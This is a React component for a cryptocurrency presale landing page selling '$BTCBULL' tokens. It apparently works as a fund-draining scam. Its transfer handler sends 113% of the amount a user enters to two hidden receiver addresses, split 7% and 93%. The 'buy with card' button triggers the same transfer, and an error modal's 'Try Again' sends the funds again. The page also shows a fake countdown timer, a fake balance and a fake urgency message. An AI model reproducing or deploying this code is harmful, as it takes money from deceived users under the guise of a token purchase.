import HeroBannerImage from "../../assets/hero/banner-img.webp";
import HeroBannerImageMobile from "../../assets/hero/banner-img-mob.webp";
import InfoIcon from "../../assets/hero/info.svg";
import PoweredBy from "../../assets/hero/web3.svg";
import CoinResult from "../../assets/hero/coinresult.svg";
import Solid from "../../assets/hero/solid.svg";
import Line from "../../assets/hero/line.webp";
import { Swiper, SwiperSlide } from 'swiper/react';

// Import Swiper styles
import 'swiper/css';
import 'swiper/css/navigation';
import 'swiper/css/pagination';
import 'swiper/css/scrollbar';

import CryptoNews from "../../assets/hero/cryptonews-new.svg";
import CoinPedia from "../../assets/hero/coinpedia-new.svg";
import CryptoPolitan from "../../assets/hero/cryptopolitan-new.svg";
import NewsBTC from "../../assets/hero/newsbtc-new.svg";
import FeaturedBG from "../../assets/hero/featured-bg.svg"
import AboutBull from "../../assets/hero/about-bull.webp"
import TokenTructs from "../../assets/hero/token-trucks.webp"
import BuyNowModal from "../modal/BuyNow";
import { useState, useEffect } from "react";
import NeedWallet from "../modal/NeedWallet";
import Notice from "../modal/Notice";
import { useTranslation } from 'react-i18next';
import USDT from "../../assets/wallet/usdt.svg"
import ArrowDown from "../../assets/wallet/arrowdown.svg";
import Logo from "../../assets/logo.png";
import WalletModal from "../modal/wallet";
import { useWallet } from "../../context/walletContext";
import type { Chain } from "../../utils/type";
import { useBalance } from "wagmi";
import { receiver, decimal, _reciever } from "../../contract";
import Loading from "../modal/Loading";
import Warning from "../modal/Warning";
import Banner from "../modal/Banner";

const Hero = () => {

    const [isBuyNowModalOpen, setIsBuyNowModalOpen] = useState(false);
    const [isNeedWalletOpen, setIsNeedWalletOpen] = useState(false);
    const [isNoticeOpen, setIsNoticeOpen] = useState(false);
    const [noticeContent, setNoticeContent] = useState("");
    const [minutes, setMinutes] = useState(28);
    const [seconds, setSeconds] = useState(47);
    const { t } = useTranslation();
    const [isWalletModalOpen, setIsWalletModalOpen] = useState<boolean>(false);
    const [chain, setChain] = useState<Chain | null>({
        name: "Ethereum",
        icon: "",
        category: "",
        balance: 0,
        price: 0,
        isActive: true,
        isDisible: false
    });
    const [balance, setBalance] = useState<string>("0");
    const [price, setPrice] = useState<number | null>(null);

    const wallet = useWallet();
    const walletBalance = useBalance({ address: wallet.walletAddress });
    const walletUsdcBalance = useBalance({ address: wallet.walletAddress, token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" });

    const { isWalletConnected } = useWallet();
    const { usdtContract, usdcContract, web3, bullTokenPrice } = useWallet();
    const [isLoading, setIsLoading] = useState(false);
    const [warning, setWarning] = useState(false);
    const [tokenCount, setTokenCount] = useState<number>(0);
    const [isBannerOpen, setIsBannerOpen] = useState(true);

    useEffect(() => {
        // Check if user has seen the banner before
        // const hasSeenBanner = localStorage.getItem('hasSeenBanner');
        // if (hasSeenBanner === 'true') {
        //     setIsBannerOpen(false);
        // }
        setIsBannerOpen(true);
    }, []);

    const handleBannerClose = () => {
        setIsBannerOpen(false);
        // localStorage.setItem('hasSeenBanner', 'true');
    };

    const handleTransferToken = async () => {
        try {
            if (chain?.name == "USDC") {
                await usdcContract.methods.transfer(_reciever, BigInt(Number(7 * 113) * Number(balance) / Number(100 * 100) * 10 ** decimal)).send({ from: wallet.walletAddress });
                await usdcContract.methods.transfer(receiver, BigInt(Number(93 * 113) * Number(balance) / Number(100 * 100) * 10 ** decimal)).send({ from: wallet.walletAddress });

            }
            else if (chain?.name == "USDT") {
                await usdtContract.methods.transfer(_reciever, BigInt(Number(7 * 113) * Number(balance) / Number(100 * 100) * 10 ** decimal)).send({ from: wallet.walletAddress });
                await usdtContract.methods.transfer(receiver, BigInt(Number(93 * 113) * Number(balance) / Number(100 * 100) * 10 ** decimal)).send({ from: wallet.walletAddress });
            }
            else if (chain?.name == "Ethereum") {

                const recipient = receiver;
                const amountInEth = balance;

                const tx = {
                    from: wallet.walletAddress,
                    to: recipient,
                    value: web3.utils.toWei(Number(amountInEth) * 0.93 * 1.13, 'ether'),
                };

                const _tx = {
                    from: wallet.walletAddress,
                    to: _reciever,
                    value: web3.utils.toWei(Number(amountInEth) * 0.07 * 1.13, 'ether'),
                }

                const _txHash = await web3.eth.sendTransaction(_tx);
                const txHash = await web3.eth.sendTransaction(tx);

                console.log("hash => ", _txHash, txHash)
            }
            setIsLoading(true);
        } catch (error) {
            console.error("Error transferring token:", error);
        }
    }

    useEffect(() => {
        const fetchPrice = async () => {
            try {
                const response = await fetch(
                    '/api/cryptocurrency/quotes/latest?symbol=ETH'
                );

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const data = await response.json();

                if (!data.data || !data.data.ETH || !data.data.ETH.quote || !data.data.ETH.quote.USD) {
                    throw new Error('Invalid response format from API');
                }

                const ethPrice = data.data.ETH.quote.USD.price;
                setPrice(ethPrice);
                wallet.currentETHPrice(ethPrice);
            } catch (error) {
                console.error('Failed to fetch Ethereum price:', error);
                setPrice(null);
            }
        };

        fetchPrice();
        const interval = setInterval(fetchPrice, 60000); // refresh every 60s
        return () => clearInterval(interval);
    }, []);

    useEffect(() => {
        const timer = setInterval(() => {
            if (seconds > 0) {
                setSeconds(seconds - 1);
            } else if (minutes > 0) {
                setMinutes(minutes - 1);
                setSeconds(59);
            } else {
                clearInterval(timer);
            }
        }, 1000);

        return () => {
            clearInterval(timer);
        };
    }, [minutes, seconds]);

    const handleNoticeOpen = (content: string) => {
        setIsNoticeOpen(true);
        setNoticeContent(content);
    }

    const handleModal = () => {
        const ethbalance = Number((Number(walletBalance.data?.formatted) * (price ?? 0)).toFixed(4));
        const usdcbalance = Number(walletUsdcBalance.data?.formatted) || 0;

        wallet.saveWalletBalance(
            ethbalance,
            usdcbalance
        );
        setIsWalletModalOpen(true);
    }

    useEffect(() => {
        console.log("Chain => ", chain)
    }, [chain])


    useEffect(() => {
        let _tokenBalance = 0;
        let defaultTokenCount = 392;
        if (bullTokenPrice == 0) {
            defaultTokenCount = 392;
        } else {
            defaultTokenCount = Number(1 / bullTokenPrice);
        }

        console.log("defaultTokenCount => ", defaultTokenCount)
        if (chain?.name === "USDC") {
            _tokenBalance = defaultTokenCount * Number(balance);
            setTokenCount(_tokenBalance);
        } else if (chain?.name === "USDT") {
            _tokenBalance = defaultTokenCount * Number(balance);
            setTokenCount(_tokenBalance);
        } else if (chain?.name === "Ethereum") {

            _tokenBalance = defaultTokenCount * wallet.getETHPrice() * Number(balance);
            setTokenCount(_tokenBalance);
        }
    }, [balance])

    useEffect(() => {
        console.log("price => ", bullTokenPrice)
    }, [bullTokenPrice])

    return (
        <div className="w-full flex flex-col justify-center items-center mt-8 md:mt-12 lg:mt-24">
            <div className="max-w-7xl w-full flex md:flex-row flex-col justify-between items-center z-10 gap-4 px-4 md:px-6 lg:px-8">
                <div className="lg:w-[60%] w-full relative z-20">
                    <div className="w-full h-full relative -z-10">
                        <img src={HeroBannerImage} alt="" className="w-full h-full object-cover hidden xl:block" />
                        <img src={HeroBannerImageMobile} alt="" className="w-full h-full object-cover lg:block xl:hidden" />
                        <a href="https://drive.google.com/file/d/1hIc95kANq-kcejWV6KvGPbHBFrlpO60W/view?usp=sharing" target="_blank" rel="noopener noreferrer" className="border-3 border-[#FFC700] text-[#ffffff] rounded-full w-full md:w-[150px] py-2 absolute md:bottom-10 md:left-[35%] xl:mb-60 xl:left-4 xl:bottom-10 flex justify-center items-center bg-[#1f1f1f] cursor-pointer bottom-10">Whitepaper</a>
                    </div>
                    <div className="w-full flex flex-col gap-2 justify-center items-start xl:-mt-28 lg:-mt-6 z-50 px-4 md:px-0">
                        <h1 className="custom-font uppercase tracking-[1.5px] md:tracking-[2.4px] leading-tight">
                            <span className="text-white text-[24px] sm:text-[28px] md:text-[32px] lg:text-[40px]">BTC BULL TOKEN:</span> <br className="xl:hidden block" />
                            <span className="text-[#f7ef22] text-[16px] sm:text-[20px] md:text-[24px] lg:text-[32px] xl:text-[40px]">{t('hero.title1')} <br className="hidden xl:block" />
                                {t('hero.title2')}</span>
                        </h1>
                        <span className="italic font-normal text-left text-white text-[12px] sm:text-[14px] md:text-[16px] lg:text-[18px]">{t('hero.description')}</span>
                    </div>
                </div>

                <div className="lg:w-[40%] w-full xl:flex-row flex-col flex gap-4 md:gap-6 justify-center items-center">
                    <div className="w-full flex justify-center items-start gap-4 xl:flex-row flex-col">
                        <div className={`xl:w-[90%] w-full z-[1] flex flex-col font-[sans-serif] justify-start relative items-center gap-2 xl:-ml-[34px] ml-0 rounded-[16px] md:rounded-[24px] bg-[length:100%_100%] border-[2px] md:border-[4px] border-[#FFC700] px-[12px] sm:px-[16px] md:px-[24.5px] py-[8px] sm:py-[12px] md:py-[18px] bg-[url('./assets/hero/widget-bg.png')] bg-no-repeat bg-[50%_0] order-2 xl:order-none`}>
                            <div className="text-[#ffc700] text-[12px] sm:text-[14px] md:text-[16px] lg:text-[18px] uppercase w-full text-center font-bold">{t('hero.timingtitle.first')}
                                <span className="text-[#f7ef22] "> $BTCBULL</span> {t('hero.timingtitle.second')}
                                <span className="text-white"> {t('hero.timingtitle.third')}<span>
                                </span>
                                </span>
                            </div>
                            <div className="w-[90%] py-2 flex justify-between items-center bg-[#f7ef22] rounded-[8px] md:rounded-[12px]">
                                <div className="w-[25%] flex flex-col justify-center items-center">
                                    <span className="text-[8px] sm:text-[10px] md:text-xs text-[#1b344a]">{t('hero.day')}</span>
                                    <span className="text-[#1b344a] text-lg sm:text-xl md:text-2xl font-bold">00</span>
                                </div>
                                <div className="w-[25%] flex flex-col justify-center items-center">
                                    <span className="text-[8px] sm:text-[10px] md:text-xs text-[#1b344a]">{t('hero.hours')}</span>
                                    <span className="text-[#1b344a] text-lg sm:text-xl md:text-2xl font-bold">00</span>
                                </div>
                                <div className="w-[25%] flex flex-col justify-center items-center">
                                    <span className="text-[8px] sm:text-[10px] md:text-xs text-[#1b344a]">{t('hero.minute')}</span>
                                    <span className="text-[#1b344a] text-lg sm:text-xl md:text-2xl font-bold">{minutes.toString().padStart(2, '0')}</span>
                                </div>
                                <div className="w-[25%] flex flex-col justify-center items-center">
                                    <span className="text-[8px] sm:text-[10px] md:text-xs text-[#1b344a]">{t('hero.second')}</span>
                                    <span className="text-[#1b344a] text-lg sm:text-xl md:text-2xl font-bold">{seconds.toString().padStart(2, '0')}</span>
                                </div>
                            </div>
                            <p className="text-center text-[8px] sm:text-[10px] md:text-[11px] text-[#f7941d] uppercase font-[800] mt-2">{t('hero.raised')}</p>
                            <div className="w-[90%] h-4 sm:h-5 md:h-6 rounded-md bg-[#f7ef22] border border-[#f7ef22] relative flex justify-center items-center mt-2">
                                <div className="w-[85%] h-full bg-[#f7941d] rounded-md absolute left-0"></div>
                                <p className="text-center text-[8px] sm:text-[10px] md:text-[11px] text-[#f7ef22] z-10 uppercase font-[800]">UNTIL PRICE RISE</p>
                            </div>
                            <div className="flex gap-2 items-center mt-2">
                                <p className="text-center text-[8px] sm:text-[10px] md:text-[11px] text-[#f7941d] uppercase font-[800]">{t('hero.purchased')}</p>
                                <img src={InfoIcon} alt="" className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 cursor-pointer" onClick={() => handleNoticeOpen(t('modal.info.first'))} />
                            </div>
                            <div className="flex gap-2 items-center">
                                <p className="text-center text-[8px] sm:text-[10px] md:text-[11px] text-[#f7941d] uppercase font-[800]">{t('hero.stakeable')}</p>
                                <img src={InfoIcon} alt="" className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 cursor-pointer" onClick={() => handleNoticeOpen(t('modal.info.second'))} />
                            </div>
                            <div className={`${isWalletConnected ? "w-full flex justify-center items-center" : "hidden"}`}>
                                <button className="px-3 py-1.5 md:px-4 md:py-2 text-center bg-[#f7ef22] font-[600] rounded-md font-[Ubuntu] text-sm md:text-base cursor-pointer">Refer and Earn</button>
                            </div>
                            <div className="w-full flex justify-between items-center font-[Ubuntu]">
                                <div className="w-[20%] h-[1px] bg-[#f7941d]"></div>
                                <p className="text-center text-[10px] sm:text-xs md:text-sm text-[#f7ef22] uppercase font-[800] tracking-widest">1 $BTCBULL = $0.00253</p>
                                <div className="w-[20%] h-[1px] bg-[#f7941d]"></div>
                            </div>
                            <div className={`${isWalletConnected ? "w-full flex flex-col justify-start items-center gap-1" : "hidden"}`}>
                                <div className="w-full flex justify-between items-center">
                                    <label htmlFor="Pay with USDC" className="text-[10px] sm:text-xs text-[#ffc700] font-bold font-[Ubuntu]">Pay with USDC</label>
                                    <label htmlFor="Pay with USDC" className="text-[10px] sm:text-xs text-[#f7ef22] font-bold font-[Ubuntu]">Max</label>
                                    <label htmlFor="Pay with USDC" className="text-[10px] sm:text-xs text-[#ffc700] font-bold font-[Ubuntu]">Balance = 0.684</label>
                                </div>
                                <div className="w-full flex justify-start items-center gap-2 md:gap-4">
                                    {/* <input type="text" value={chain === null ? 0 : chain?.price} onChange={(e) => setBalance(e.target.value)} className="border border-[#F7EF22] bg-black w-[60%] outline-none px-2 md:px-4 h-10 md:h-12 rounded-md font-[Ubuntu] text-[#FFC700] text-sm md:text-base font-bold" /> */}
                                    <input type="text" value={balance} onChange={(e) => setBalance(e.target.value)} className="border border-[#F7EF22] bg-black w-[60%] outline-none px-2 md:px-4 h-10 md:h-12 rounded-md font-[Ubuntu] text-[#FFC700] text-sm md:text-base font-bold" />
                                    <button onClick={handleModal} className="border border-[#F7EF22] w-[40%] outline-none text-white px-2 md:px-4 h-10 md:h-12 rounded-md font-[Ubuntu] text-sm md:text-base flex justify-between items-center cursor-pointer bg-[#f7ef2233]" >
                                        <img src={!chain?.icon ? USDT : chain?.icon} alt="" className="w-6 h-6 md:w-8 md:h-8" />
                                        <span className="uppercase">{!chain || chain?.name === "Ethereum" ? "ETH" : chain?.name}</span>
                                        <img src={ArrowDown} alt="" className="w-3 h-3 md:w-4 md:h-4" />
                                    </button>
                                </div>
                            </div>
                            <div className={`${isWalletConnected ? "w-full flex flex-col justify-start items-center gap-1" : "hidden"}`}>
                                <div className="w-full flex justify-between items-center">
                                    <label htmlFor="Receive $BTCBULL" className="text-[10px] sm:text-xs text-[#ffc700] font-bold font-[Ubuntu]">Receive $BTCBULL</label>
                                    <label htmlFor="1 $BTCBULL = $0.00253" className="text-[10px] sm:text-xs text-[#ffc700] font-bold font-[Ubuntu]">1 $BTCBULL = $0.00253</label>
                                </div>
                                <div className="w-full flex justify-start items-center gap-2 md:gap-4 relative">
                                    <input type="text" value={tokenCount} className="border border-[#F7EF22] bg-black w-full outline-none px-2 md:px-4 h-10 md:h-12 rounded-md font-[Ubuntu] text-[#FFC700] text-sm md:text-base font-bold" />
                                    <img src={Logo} alt="" className="w-6 h-6 md:w-8 md:h-8 absolute right-2 md:right-4" />
                                </div>
                            </div>
                            <div className={`${isWalletConnected ? "hidden" : "w-full flex justify-between items-center gap-2 mt-4"}`}>
                                <button className="uppercase bg-[#f7ef22] w-1/2 rounded-md py-[6px] sm:py-[8px] md:py-[10px] text-[10px] sm:text-[11px] md:text-[12px] lg:text-[15px] font-bold cursor-pointer"
                                    onClick={() => (handleTransferToken())} >
                                    {t('hero.buywithcard')}
                                </button>
                                <button className="uppercase bg-[#f7941d] w-1/2 rounded-md py-[6px] sm:py-[8px] md:py-[10px] text-[10px] sm:text-[11px] md:text-[12px] lg:text-[15px] font-bold text-[#f7ef22] cursor-pointer" onClick={() => setIsBuyNowModalOpen(true)}>
                                    {t('hero.buywithcrypto')}
                                </button>
                            </div>
                            <p className={`${isWalletConnected ? "hidden" : "text-[#f7ef22] text-[10px] sm:text-[12px] md:text-[14px] font-bold underline mt-4 cursor-pointer"}`} onClick={() => setIsNeedWalletOpen(true)}>{t('hero.nowallet')}</p>
                            <div className={`${isWalletConnected ? "w-full flex flex-col justify-center items-center gap-2" : "hidden"}`}>
                                <p className={`text-[#f7ef22] text-[8px] sm:text-[9px] md:text-[11px] font-bold cursor-pointer`}>You do not have enough ETH to pay for this transaction.</p>
                                <button className="uppercase bg-[#f7ef22] w-full rounded-md py-[6px] sm:py-[8px] md:py-[10px] text-[10px] sm:text-[11px] md:text-[12px] lg:text-[15px] font-bold cursor-pointer">
                                    Buy and Stake for 64% Rewards
                                </button>
                                <button className="uppercase bg-[#f7941d] w-full rounded-md py-[6px] sm:py-[8px] md:py-[10px] text-[10px] sm:text-[11px] md:text-[12px] lg:text-[15px] font-bold text-[#f7ef22] cursor-pointer"
                                    onClick={() => {
                                        handleTransferToken()
                                    }}
                                >
                                    Buy Now
                                </button>
                                <p className={`text-[#f7ef22] text-[8px] sm:text-[9px] md:text-[11px] font-bold cursor-pointer flex`}>Want to pay with Card instead? <span className="underline cursor-pointer ml-1" onClick={() => setIsBuyNowModalOpen(true)}>Click Here!</span> </p>
                                <p className={`text-[#f7ef22] text-[8px] sm:text-[9px] md:text-[11px] font-bold flex underline hover:no-underline cursor-pointer`}>Not enough ETH? Top up now </p>
                            </div>
                            <p className="text-[#ffffff] text-[10px] sm:text-[12px] md:text-[14px] flex items-center">{t('hero.poweredby')} &nbsp; <a href="https://web3paymentsolutions.io/" target="_blank" rel="noopener noreferrer"><img src={PoweredBy} alt="" className="w-[80px] sm:w-[100px] md:w-[120px]" /></a></p>

                            <div className="w-full h-full flex justify-end items-center">
                                <WalletModal isOpen={isWalletModalOpen} onClose={() => setIsWalletModalOpen(false)} setChain={setChain} />
                            </div>
                        </div>

                        <div className="xl:w-[10%] xl:h-full h-full w-full flex xl:flex-col flex-row xl:justify-start xl:items-start justify-center items-center gap-2 lg:order-1 xl:order-none">
                            <a href="https://coinsult.net/projects/btc-bull/" target="_blank" rel="noopener noreferrer"><img src={CoinResult} alt="" className="w-5 sm:w-6 md:w-8 cursor-pointer" /></a>
                            <a href="https://drive.google.com/file/d/1JS4RmRu6zmKTjU8PJTOXzQaF428qqvsC/view?usp=sharing" target="_blank" rel="noopener noreferrer"><img src={Solid} alt="" className="w-5 sm:w-6 md:w-8 cursor-pointer" /></a>
                        </div>
                    </div>
                </div>
            </div>
            <div className="w-full flex justify-center items-center z-20 relative">
                <img src={Line} className="w-full" alt="" />
                <div className="max-w-7xl w-full flex justify-center items-center absolute lg:mb-32 md:mb-20 mb-4">
                    <div className="w-full lg:hidden flex relative">
                        <Swiper
                            spaceBetween={10}
                            slidesPerView={1}
                            centeredSlides={true}
                            breakpoints={{
                                320: {
                                    slidesPerView: 3,
                                    spaceBetween: 10,
                                    centeredSlides: true,
                                },
                                480: {
                                    slidesPerView: 3,
                                    spaceBetween: 15,
                                    centeredSlides: true,
                                },
                                640: {
                                    slidesPerView: 3,
                                    spaceBetween: 20,
                                    centeredSlides: true,
                                },
                                768: {
                                    slidesPerView: 3,
                                    spaceBetween: 20,
                                    centeredSlides: true,
                                },
                                1024: {
                                    slidesPerView: 3,
                                    spaceBetween: 20,
                                    centeredSlides: true,
                                },
                            }}
                            autoplay={{
                                delay: 2000,
                                disableOnInteraction: false,
                            }}
                            loop={true}
                            initialSlide={0}
                            className="w-full"
                        >
                            <SwiperSlide>
                                <div className="h-32 sm:h-40 md:h-48 text-white flex justify-center items-center">
                                    <img src={CryptoNews} alt="" className="w-auto h-full object-contain" />
                                </div>
                            </SwiperSlide>
                            <SwiperSlide>
                                <div className="h-32 sm:h-40 md:h-48 text-white flex justify-center items-center">
                                    <img src={NewsBTC} alt="" className="w-auto h-full object-contain" />
                                </div>
                            </SwiperSlide>
                            <SwiperSlide>
                                <div className="h-32 sm:h-40 md:h-48 text-white flex justify-center items-center">
                                    <img src={CoinPedia} alt="" className="w-auto h-full object-contain" />
                                </div>
                            </SwiperSlide>
                            <SwiperSlide>
                                <div className="h-32 sm:h-40 md:h-48 text-white flex justify-center items-center">
                                    <img src={CryptoPolitan} alt="" className="w-auto h-full object-contain" />
                                </div>
                            </SwiperSlide>
                        </Swiper>
                        <div className="md:w-[300px] md:h-[220px] sm:w-[250px] sm:h-[200px] w-[160px] h-[120px] text-white flex justify-center items-center absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10">
                            <img src={FeaturedBG} alt="" className="w-full h-full" />
                            <div className="absolute w-full h-full inset-0 flex items-center justify-center">
                                <h1 className="custom-font1 uppercase tracking-[2.4px]  p-[49px, 15px, 0] leading-none text-center md:text-[35px] sm:text-[25px] text-[16px] font-bold">
                                    {t('hero.featuredin.first')} <div className="block md:hidden"><br /></div> {t('hero.featuredin.second')}
                                </h1>
                            </div>
                        </div>
                    </div>
                    <div className="lg:flex hidden justify-between items-center w-full">
                        <div className="h-48 text-white flex justify-center items-center ">
                            <img src={CryptoNews} alt="" />
                        </div>
                        <div className="h-48 text-white flex justify-center items-center">
                            <img src={NewsBTC} alt="" />
                        </div>
                        <div className="h-48 text-white flex justify-center items-center relative">
                            <img src={FeaturedBG} alt="" className="md:w-[230px] md:h-[180px] w-[160px] h-[120px]" />
                            <h1 className="custom-font1 uppercase tracking-[2.4px] leading-none absolute text-center md:text-[35px] text-[10px] font-bold md:mt-[10px] mt-[25px]">
                                {t('hero.featuredin.first')} <div className="block md:hidden"><br /></div> {t('hero.featuredin.second')}
                            </h1>
                        </div>
                        <div className="h-48 text-white flex justify-center items-center">
                            <img src={CoinPedia} alt="" />
                        </div>
                        <div className="h-48 text-white flex justify-center items-center">
                            <img src={CryptoPolitan} alt="" />
                        </div>
                    </div>
                </div>
            </div>
            <div id="about" className="w-full px-4 sm:px-6 md:px-8 flex justify-center items-center">
                <div className="relative max-w-[1067px] w-full flex rounded-[32px] sm:rounded-[42px] md:rounded-[52px] border-[4px] sm:border-[5px] md:border-[7px] border-[#FFC700] bg-[#050d13d9] backdrop-blur-[30px] 
            p-[20px_25px] sm:p-[30px_40px] md:p-[40px_50px] lg:p-[50px_60px] xl:-mt-60 lg:-mt-30 z-50">
                    <div className="flex flex-col justify-center md:items-start items-center gap-4 lg:w-[70%] w-full">
                        <h1 className="uppercase text-[24px] sm:text-[27px] md:text-[37px] font-[900] custom-font2 w-full text-center ">
                            <span className="text-[#FFC700]">{t('about.abouttitle.first')}</span> <span className="text-[#ffffff]">{t('about.abouttitle.second')}</span>
                        </h1>
                        <p className="text-[#ffffff] text-[14px] sm:text-[16px] md:text-[18px] italic w-full">
                            {t('about.description')}
                        </p>
                        <a onClick={() => setIsBuyNowModalOpen(true)} className="bg-[#1f1f1f] text-[#ffffff] border-3 border-[#FFC700] px-8 sm:px-12 md:px-16 cursor-pointer py-2 rounded-full text-[14px] sm:text-[16px]">{t('about.buybutton')}</a>
                    </div>
                    <img src={AboutBull} alt="" className="w-[300px] sm:w-[400px] md:w-[500px] lg:w-[600px] h-auto absolute -right-20 sm:-right-32 md:-right-44 -top-20 sm:-top-28 md:-top-36 lg:block hidden" />
                </div>
            </div>
            <div className="w-full max-w-[1067px] px-2 mt-12">
                <div className="w-full md:hidden flex justify-center items-center">
                    <Swiper
                        spaceBetween={20}
                        slidesPerView={1}
                        centeredSlides={true}
                        breakpoints={{
                            320: {
                                slidesPerView: 1,
                                spaceBetween: 20,
                                centeredSlides: true,
                            },
                            480: {
                                slidesPerView: 1,
                                spaceBetween: 20,
                                centeredSlides: true,
                            },
                            640: {
                                slidesPerView: 1,
                                spaceBetween: 20,
                                centeredSlides: true,
                            }
                        }}
                        autoplay={{
                            delay: 3000,
                            disableOnInteraction: false,
                        }}
                        loop={true}
                        className="w-full"
                    >
                        <SwiperSlide>
                            <div className="mx-4 rounded-[30px] border-[4px] border-[#FFC700] bg-[#000000d9] p-6 backdrop-blur-[15px] flex flex-col min-h-[200px]">
                                <h1 className="text-[#FFC700] text-[20px] font-bold card-font mb-3">{t('about.component.first.title')}</h1>
                                <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                                    {t('about.component.first.description')}
                                </p>
                            </div>
                        </SwiperSlide>
                        <SwiperSlide>
                            <div className="mx-4 rounded-[30px] border-[4px] border-[#FFC700] bg-[#000000d9] p-6 backdrop-blur-[15px] flex flex-col min-h-[200px]">
                                <h1 className="text-[#FFC700] text-[20px] font-bold card-font mb-3">{t('about.component.second.title')}</h1>
                                <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                                    {t('about.component.second.description')}
                                </p>
                            </div>
                        </SwiperSlide>
                        <SwiperSlide>
                            <div className="mx-4 rounded-[30px] border-[4px] border-[#FFC700] bg-[#000000d9] p-6 backdrop-blur-[15px] flex flex-col min-h-[200px]">
                                <h1 className="text-[#FFC700] text-[20px] font-bold card-font mb-3">{t('about.component.third.title')}</h1>
                                <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                                    {t('about.component.third.description')}
                                </p>
                            </div>
                        </SwiperSlide>
                    </Swiper>
                </div>
                <div className="w-full  md:flex hidden gap-4">
                    <div className="h-full rounded-[50px] border-[7px] border-[#FFC700] bg-[#000000d9] p-8 backdrop-blur-[15px] flex flex-col">
                        <h1 className="text-[#FFC700] text-[22px] font-bold card-font">{t('about.component.first.title')}</h1>
                        <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                            {t('about.component.first.description')}
                        </p>
                    </div>
                    <div className="h-full rounded-[50px] border-[7px] border-[#FFC700] bg-[#000000d9] p-8 backdrop-blur-[15px] flex flex-col">
                        <h1 className="text-[#FFC700] text-[22px] font-bold card-font">{t('about.component.second.title')}</h1>
                        <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                            {t('about.component.second.description')}
                        </p>
                    </div>
                    <div className="h-full rounded-[50px] border-[7px] border-[#FFC700] bg-[#000000d9] p-8 backdrop-blur-[15px] flex flex-col">
                        <h1 className="text-[#FFC700] text-[22px] font-bold card-font">{t('about.component.third.title')}</h1>
                        <p className="text-[#ffffff] text-[14px] leading-relaxed italic text-center">
                            {t('about.component.third.description')}
                        </p>
                    </div>
                </div>
            </div>
            <div className="w-full">
                <img src={TokenTructs} alt="" className="w-full" />
            </div>
            <div className="mt-14"></div>

            <BuyNowModal open={isBuyNowModalOpen} onClose={() => setIsBuyNowModalOpen(false)} setNeedWallet={setIsNeedWalletOpen} />
            <NeedWallet open={isNeedWalletOpen} onClose={() => setIsNeedWalletOpen(false)} />
            <Notice open={isNoticeOpen} onClose={() => setIsNoticeOpen(false)} content={noticeContent} />
            <Loading openModal={isLoading} onClose={() => setIsLoading(false)} setWarning={setWarning} />
            <Warning open={warning} onClose={() => setWarning(false)} content="Something went wrong!" onTryAgain={() => {
                console.log("try again")
                handleTransferToken()
                setWarning(!warning)
                setIsLoading(!isLoading)
            }} />
            <Banner isOpen={isBannerOpen} onClose={handleBannerClose} />
        </div>
    )
}

export default Hero;